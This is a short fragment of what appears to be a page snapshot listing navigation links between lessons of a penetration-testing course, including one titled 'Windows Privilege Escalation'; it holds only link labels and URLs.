+      - /url: ./0005-exploiting-the-web-foothold.html
+    - 'link "Next → Lesson 07: Windows Privilege Escalation" [ref=f1e392] [cursor=pointer]':
+      - /url: ./0007-windows-privilege-escalation.html
